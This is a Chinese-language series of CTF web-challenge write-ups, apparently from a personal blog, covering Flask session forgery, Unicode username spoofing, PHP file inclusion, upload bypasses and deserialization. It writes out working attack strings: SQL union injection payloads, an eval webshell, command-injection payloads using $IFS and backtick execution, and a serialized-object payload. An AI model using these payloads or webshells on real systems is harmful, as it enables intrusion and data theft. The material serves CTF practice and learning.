<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaikmtd1aj30qx09at9f.jpg" alt=""><br>发现index注册函数没做什么处理，直接返回index.html渲染模版，于是我们看一下templates/index.html代码</p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaiovsvsej30ql0ndmza.jpg" alt=""></p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaip70juwj30pc0fyt9w.jpg" alt=""></p>
<p>发现真的是要登录成admin才能得到flag。于是继续看向route.py文件，看看login和change password的注册函数处理代码是怎么写的。</p>
<p><strong>解法一 —— flask session 伪造</strong></p>
<p>我们可以用python脚本把flask的session解密出来，但是如果想要加密伪造生成我们自己的session的话，还需要知道flask用来签名的SECRET_KEY，在github源码里找找，可以在config.py里发现下面代码</p>
<p><a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener" title="flask_session_manage">https://github.com/noraj/flask-session-cookie-manager</a><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaixw55qtj30pa05qq39.jpg" alt=""></p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfalpci52zj30og04oq36.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfalpr57d2j30ml05xwjt.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfalqobraoj30mj05c42c.jpg" alt=""></p>
<p>用得到的cookie值替换掉index页面的cookie值，即可成功伪造session，”变成admin”，得到flag</p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaltk9yfnj30qb0bkt95.jpg" alt=""></p>
<p><strong>法二 —— Unicode欺骗</strong></p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfamywjzioj30d502jglg.jpg" alt=""><br>这里用到了nodeprep.prepare函数，而nodeprep是从twisted模块中导入的from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep，在requirements.txt文件中，发现这里用到的twisted版本是Twisted==10.2.0，而官网最新版本为19.2.0(2019/6/2)，版本差距这么大，估计是存在什么漏洞。</p>
<p>原理就是利用nodeprep.prepare函数会将unicode字符ᴬ转换成A，而A在调用一次nodeprep.prepare函数会把A转换成a。<br>所以当我们用ᴬdmin注册的话，后台代码调用一次nodeprep.prepare函数，把用户名转换成Admin，我们用ᴬdmin进行登录，可以看到index页面的username变成了Admin，证实了我们的猜想，接下来我们就想办法让服务器再调用一次nodeprep.prepare函数即可。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfan8syszjj30cq09j3yj.jpg" alt=""></p>
<p>我们发现在改密码函数代码里，也用到了nodeprep.prepare函数，也就是说，我们在这里改密码的话，先会把username改为admin，从而改掉admin的密码。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfana7tvutj30om0as74g.jpg" alt=""><br>然后用admin和改的密码的登录，即可获取flag。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfanbj04yrj30sz0bpt95.jpg" alt=""></p>
<p><strong>解法三 —— 条件竞争</strong><br><a href="https://www.jianshu.com/p/f92311564ad0" target="_blank" rel="noopener" title="HCTF2018-admin">https://www.jianshu.com/p/f92311564ad0</a></p>
<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfanstiw0oj30sy04ggmf.jpg" alt=""><br>查看源码发现提示</p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfantton39j30lg0cd74g.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfanujro2lj30ev087dft.jpg" alt=""></p>
<p>继续点击，发现什么也没有，根据提示抓包分析。</p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfanvn1llgj307804va9x.jpg" alt=""></p>
<p>发现php页面，打开该页面<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbe5son5aj30uk0aaaap.jpg" alt=""><br>发现是文件包含漏洞。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbefqitdfj30s7092aa9.jpg" alt=""><br>但是打开flag.php并不能看到flag，所以flag应该是写在php代码里面</p>
<p>传入的文件进行了过滤，但没有过滤filter，所以可以用php://filter来获取文件。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbebnttfzj31hc096abe.jpg" alt=""><br>获取到flag.php的base64编码，进行解码获得flag。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbee8u6y0j30m60880tg.jpg" alt=""></p>
<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbetawh5jj308g048mx2.jpg" alt=""></p>
<p>发现是文件上传漏洞，于是想到上传一句话木马。</p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbeulv6d1j307n04pwef.jpg" alt=""></p>
<p>上传一句话木马后发现&lt;?被过滤了，所以不能使用&lt;?php,所以使用其他的方法构造一句话木马，如script脚本<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbfoa6kc7j30hg00wa9v.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbfp2jc2oj308v059mx5.jpg" alt=""></p>
<p>上传之后发现错误提示，所以需要绕过exif_imagetype。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbfrgfz2nj30hf01m0sm.jpg" alt=""></p>
<p>所以在一句话木马前加上GIF89a再上传。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbfuz0qq3j30np05sgly.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbfwrx895j30ae04wq2s.jpg" alt=""></p>
<p>然后用蚁剑连接index.php页面，发现不能连接，所以是木马没有执行。</p>
<p>看了题解后发现这题还有一个知识点就是<strong>.user.ini</strong><br><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener" title=".user.ini">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbg2rycpdj309w01tmwz.jpg" alt=""><br>于是创建一个.user.ini文件并将.user.ini和aaa.jpg文件上传<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbg4unow1j30tl05m3yw.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbg63dc06j30ca03zmx5.jpg" alt=""></p>
<p>然后蚁剑连接获得flag。</p>
<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbgko45ufj30rh0i5woi.jpg" alt=""><br>尝试万能密码<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbgm3qdh3j30tj09kgpl.jpg" alt=""><br>登录成功，说明存在注入点</p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbgpg5cd6j30eu03iq32.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbgpu8llwj30sy09fgp3.jpg" alt=""><br>说明有3个字段。</p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbgr5czwlj30f80a4dj7.jpg" alt=""></p>
<p>在用户名方框里没有注入成功，在密码方框里注入成功</p>
<p>在密码框中使用<br>admin’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #<br>列出表名<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbh26o28hj30lb0a0wi4.jpg" alt=""></p>
<p>接着使用<br>admin’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=”l0ve1ysq1” #<br>列出字段</p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbh9yytzxj30m109z420.jpg" alt=""></p>
<p>最后使用<br>admin’ union select 1,2,group_concat(password) from l0ve1ysq1 #<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbhbpxpejj30wy0d2jxu.jpg" alt=""></p>
<p>获得flag。</p>
<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbl86nvixj30oj07g3zk.jpg" alt=""><br>根据提示，页面有备份文件</p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbl7ooiwbj30aw011weh.jpg" alt=""></p>
<p>使用dirsearch扫描，发现备份文件<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbl9scevgj30l804gwep.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfblb4esaxj30og0o3gn8.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfblbvo3qlj30b403x3yh.jpg" alt=""></p>
<p>从class.php和index.php可知，该题是反序化漏洞。代码审计可知username应为admin，password应为100才能获得flag。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfblhrdqzsj30j00fl75c.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfblitplw1j30lg01ya9x.jpg" alt=""></p>
<p>将代码反序化</p>
<p>public、protected与private在序列化时的区别和__wakeup()方法绕过参考：<br><a href="https://www.cnblogs.com/wangtanzhi/p/12193930.html" target="_blank" rel="noopener" title="参考链接">https://www.cnblogs.com/wangtanzhi/p/12193930.html</a></p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfblqidxzoj314i0hddj5.jpg" alt=""><br>构造payload获得flag，也可以参考上面的参考链接中<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfblrwxv7sj30na01q0sn.jpg" alt=""></p>
<p>用python传值获得flag</p>
<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfblwywrjlj30lt0980sw.jpg" alt=""></p>
<p>发现是一句话木马，直接用菜刀连接</p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfblyno71fj30gj08e74n.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfblzgek3aj30f403kq2y.jpg" alt=""></p>
<p>然后获得flag。</p>
<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbm49rup2j30jw06iglm.jpg" alt=""></p>
<p>查看源码，发现提示<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbm5hp0hdj319b09pn3u.jpg" alt=""><br>想到抓包，直接改header头信息即可，我们可以通过使用Referer头来修改<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbm8kwmz8j30yn0ha76b.jpg" alt=""><br>修改之后提示说使用Syclover浏览，于是修改User-Agent<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbma2trtuj30yp0gftan.jpg" alt=""><br>根据提示，需要修改X-Forwarded-For为127.0.0.1<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbmcnwclyj30y70g940e.jpg" alt=""><br>从而获得flag。</p>
<h2 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a>[GKCTF2020]CheckIN</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbmr1prhpj30ne0dbdgp.jpg" alt=""></p>
<p>审计代码发现Ginkgo可以传参，于是想到可以传一句话木马，审计代码可知要把$this-&gt;code进行base64加密。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbnef4v15j30qo0213yl.jpg" alt=""></p>
<p>所以Ginkgo传入加密后的<strong>@eval($_POST[value]);</strong><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbng00sipj30f60c774p.jpg" alt=""></p>
<p>用蚁剑连接<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbnuh85awj30jw076taw.jpg" alt=""></p>
<p>直接利用github上的exploit:<br><a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank" rel="noopener" title="exploit">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbnxf3636j30gd07wmxj.jpg" alt=""><br>改为执行/readflag。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbnyikohcj30s90fomy3.jpg" alt=""><br>上传到服务器</p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbo3njuclj30zr066t9l.jpg" alt=""><br>构造payload：?Ginkgo=include(‘/tmp/exploit.php’);并将include(‘/tmp/exploit.php’);用base64加密，执行获得flag。</p>
<h2 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h2><p>由hint知识<strong>cve-2020-7066，ssrf</strong>漏洞<br><a href="https://security-tracker.debian.org/tracker/CVE-2020-7066" target="_blank" rel="noopener" title="CVE-2020-7066">https://security-tracker.debian.org/tracker/CVE-2020-7066</a><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbo8gz2aaj30mi040t8s.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbo9eot9fj30rc0hu0th.jpg" alt=""><br>点击View CTFHub发现什么也没有<br>根据漏洞可知存在\0截断。<br><a href="https://blog.csdn.net/weixin_45485719/article/details/106432960?fps=1&locationNum=2" target="_blank" rel="noopener" title="cve-2020-7066简单解析">https://blog.csdn.net/weixin_45485719/article/details/106432960?fps=1&amp;locationNum=2</a><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbofn9rapj309h014q2q.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbodclbhzj30u20gygn7.jpg" alt=""><br>根据提示知应该改为127.0.0.123<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfboejavs8j30ti0hh75x.jpg" alt=""><br>从而获得flag。 </p>
<h2 id="GKCTF2020-老八小超市儿"><a href="#GKCTF2020-老八小超市儿" class="headerlink" title="[GKCTF2020]老八小超市儿"></a>[GKCTF2020]老八小超市儿</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbokpmsh8j30ze0bxjya.jpg" alt=""><br>从图中可知是ShopXO漏洞<br>参考<br><a href="http://www.nctry.com/1660.html" target="_blank" rel="noopener" title="ShopXO">http://www.nctry.com/1660.html</a><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbonczmoqj30vx0gracr.jpg" alt=""><br>进入后台登录界面，用admin,shopxo登录后台<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbopongy4j30si0l9tdo.jpg" alt=""><br>下载默认主题<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbottukynj30qw06naal.jpg" alt=""><br>将写好的一句话木马文件直接拖入压缩包中(注意：不能先解压然后将文件放进去再压缩，这样文件就会失效)<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbow18efvj30lf0ea0tk.jpg" alt=""><br>然后上传木马文件，用蚁剑连接<br>地址是：<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbozq44m5j30lu01oaa1.jpg" alt=""><br>在目录下看到<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbp0wk696j30ko02it8o.jpg" alt=""><br>告诉我们flag在/root下，并且flaghint中的时间每隔一分钟会变化<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbp394dfvj30ih03ogln.jpg" alt=""><br>根据auto.sh找到makeflaghint.py<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbp78g5shj30a805dt8x.jpg" alt=""></p>
<p>发现有修改权限，且有root的执行权限，能每60秒刷新hint文件。</p>
<p>rb+ 读写打开一个二进制文件，只允许读写数据。<br><a href="https://blog.csdn.net/guyue6670/article/details/6681037" target="_blank" rel="noopener" title="fopen">https://blog.csdn.net/guyue6670/article/details/6681037</a><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbpc2izasj30a006ct90.jpg" alt=""></p>
<p>于是修改代码能读取flag并写入flag.hint文件中<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbpdoahgmj30bp03wq2z.jpg" alt=""></p>
<p>等待60秒查看获得flag。</p>
<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>本题是文件包含漏洞，使用php://filter伪协议来进行包含。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giozldc8t9j31b60k53zv.jpg" alt=""><br>获得一段base64编码。<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giozma059gj30cr022glm.jpg" alt=""><br>base64解密后获得flag。</p>
<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giqis13lyqj30us0liwfq.jpg" alt=""><br>和之前做过的一个题类似，直接构造payload:<br>?ip=127.0.0.1|ls<br>发现flag文件。  |直接执行后面的语句。<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giqivbz1h2j30xq0lcabb.jpg" alt=""><br>直接cat flag.php发现题目过滤了空格，所以用${IFS}$绕过空格。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giqj1r0h4qj30vn0kygmu.jpg" alt=""><br>使用${IFS}$发现过滤了{符号，所以使用$IFS$1过滤。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giqj3f00kkj30rq0l8gmq.jpg" alt=""><br>使用$IFS$1发现题目又过滤了flag。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giqj47ke8cj30u50lb76l.jpg" alt=""><br>查看该题源码即可知道本次过滤了哪些东西。</p>
<p>方法一：<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giqj6axvdrj30t90lc0v0.jpg" alt=""><br>参考大佬的wp，构造payload:cat$IFS$1<code>ls</code>,查看源码获得flag。<br>该方法名叫内联执行。方法：将反引号内命令的输出作为输入执行。</p>
<p>方法二：<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giqjxzkiesj31050legmz.jpg" alt=""><br>Y2F0IGZsYWcucGhw是cat flag.php的base64编码。</p>
<p>方法三：<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giqk3hkg8jj30wg0lidh7.jpg" alt=""><br>采用拼接的方法。<br>参考:<a href="https://www.ghtwf01.cn/index.php/archives/273/" target="_blank" rel="noopener">https://www.ghtwf01.cn/index.php/archives/273/</a></p>
<h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giqkcm3prij30oy0a9q37.jpg" alt=""><br>打开发现和上一题一样，于是构造一样的payload发现该目录下没有flag。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giqke8rijtj30d309aq2w.jpg" alt=""></p>
<p>查看上一级目录也没有发现flag。<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1giqkfcr8nyj30d40izjrl.jpg" alt=""><br>所以猜测flag在根目录下，查询后发现果然有flag。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1giqkghkrxbj30cp08vjrg.jpg" alt=""><br>从而获得flag。</p>
<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giqlq6u9b5j31d40ic13y.jpg" alt=""><br>经过测试发现本题需要使用双写进行绕过，并且from,union,select这些函数都被替换为空。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giqlshb7inj31470i4gve.jpg" alt=""><br>使用联合注入进行注入。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giqltzeyfej31260hrtif.jpg" alt=""><br>查询数据库名。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1giqm338dbnj31g40kk145.jpg" alt=""><br>查表名。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giqm46pu58j31fa0iu7fm.jpg" alt=""><br>查列名。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giqm5a52iyj319p0j07f9.jpg" alt=""><br>查字段。</p>
<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1girdbmsqz3j30tb08x0zk.jpg" alt=""><br>尝试上传带有一句话木马的jpg文件发现题目过滤了&lt;?。</p>
<p><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1girdh6orubj30st0620sw.jpg" alt=""></p>
<p>修改木马为：<script language="php">eval($_POST['shell']);</script><br>显示文件不是图片，所以加上GIF89a绕过图片检测。<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1girdhhemukj30mw06y74b.jpg" alt=""></p>
<p>成功上传文件<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1girdmbo2g3j30qa05oq3e.jpg" alt=""><br>然后抓包修改文件后缀名为php发现被检测到了。</p>
<p>某些情况下绕过后缀名检测：</p>
<p>php,php3,php4,php5,phtml,pht</p>
<p><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1girdp5j5ibj30po07emxw.jpg" alt=""><br>逐个测试，最后发现使用phtml可以绕过检测，从而成功上传木马。<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1girdqlg5c1j30ps04yglt.jpg" alt=""><br>连接蚁剑后在根目录下找到flag。</p>
<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>从题目可知该题是要查找备份文件，尝试.bak发现备份文件。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gire1el7lpj30ld0amdge.jpg" alt=""><br>审计代码可知输入的key只能为数字而且key要和str相等才能获得flag.</p>
<p>本题考查PHP的弱类型特性，int和string是无法直接比较的，php会将string转换成int然后再进行比较，转换成int比较时只保留数字。<br>所以只需要key等于123即可获得flag。</p>
<h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1girm8rdlp3j30vz0bq75t.jpg" alt=""><br>上传文件的题，于是上传带有一句话木马的jpg文件然后抓包修改后缀为.php发现被检测出来了，尝试之前的利用phtml绕过。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1girmaxa2qsj313g0aqmys.jpg" alt=""><br>成功上传文件。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1girmbw5y7yj30rh05ogm0.jpg" alt=""><br>蚁剑连接后在根目录成功获得flag。</p>
<h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>查看源码发现pay.php页面。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1girmtur0qsj30gw090t9g.jpg" alt=""><br>查看pay.php页面的源码发现如上代码。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1girmw99p9wj310e01pt8n.jpg" alt=""><br>抓包分析发现需要cuit’s学生才能购买，而且user=0，所以想到这里的user是判断是不是cuit’s学生，修改user=1后证明猜想。<br>下一步便是如让password=404，但是password不能是数字。</p>
<p>这里考查<strong>php中的is_numeric()漏洞</strong></p>
<p>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！</p>
<p><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1girn38afobj314r03jmx8.jpg" alt=""><br>password正确后便是输入money，但是money的值显示长度太长。</p>
<p>strcmp漏洞</p>
<p>注：这一个漏洞适用与5.3之前版本的php</p>
<p>这个函数是用于比较字符串的函数</p>
<p>int strcmp ( string $str1 , string $str2 )</p>
<p>参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</p>
<p>可知，传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数将会有怎么样的行为呢？实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0 。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1girn896mbtj30ya04h3ym.jpg" alt=""><br>所以采用数组绕过money获得flag。</p>
<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1girof886dzj30on0d4ab6.jpg" alt=""><br>打开题目即可看到源码。</p>
<p>第一个需要绕过的点：</p>
<p>if(isset($text)&amp;&amp;(file_get_contents($text,’r’)===”welcome to the zjctf”))</p>
<p>需要我们传入一个文件并且文件内容为welcome to the zjctf。<br>本题没有符合该内容的文件，所以使用data伪协议。<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giromvw3t1j30sx0bz0tr.jpg" alt=""><br>构造?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=绕过第一个检测。</p>
<p>第二个需要绕过的点:<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1girp05dtdkj30dv059q36.jpg" alt=""></p>
<p>本题不能直接读取flag，所以需要先读取useless.php的内容，针对php文件需要进行base64编码，不然不能读到内容。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giroxrba4aj30fb07vt8v.jpg" alt=""><br>构造?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/convert.base64-encode/resource=useless.php读取到useless.php的内容。</p>
<p>第三个需要绕过的点:</p>
<p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giroqu3o0yj30bq0300so.jpg" alt=""><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1girp620tycj30iz0gjab3.jpg" alt=""><br>所以构造password能够读到flag.php的内容。<br>最后的payload:<br>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}<br>查看源码获得flag。</p>
<p>参考：<br><a href="https://www.cnblogs.com/wangtanzhi/p/12184759.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12184759.html</a></p>
<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1girsnt4zzrj31bl07r0u6.jpg" alt=""><br>在网络中的响应头中发现本题的提示</p>
<p>select * from ‘admin’ where password=md5($pass,true)<br>查看wp后知道本关使用ffifdyop来绕过，这个字符串md5加密后是276f722736c95d99e921722cf9ed621c，经过hex解密后是’or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c。拼接后形式是select * from ‘admin’ where password=’’ or ‘6xxxxx’构成万能密码，从而绕过md5函数。</p>
<p>输入ffifdyop后页面发生变化。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1girt0gqvt9j30eq05vmxb.jpg" alt=""></p>
<p>在源码中发现以上内容。</p>
<p>md5 bypass</p>
<p>md5()或者sha1()之类的函数计算的是一个字符串的哈希值，对于数组则返回false，如果$a和$b都是数组则双双返回FALSE, 两个FALSE相等得以绕过。</p>
<p>这里也可以找出md5都是0e开头的，0e开头的md5的结果为0.</p>
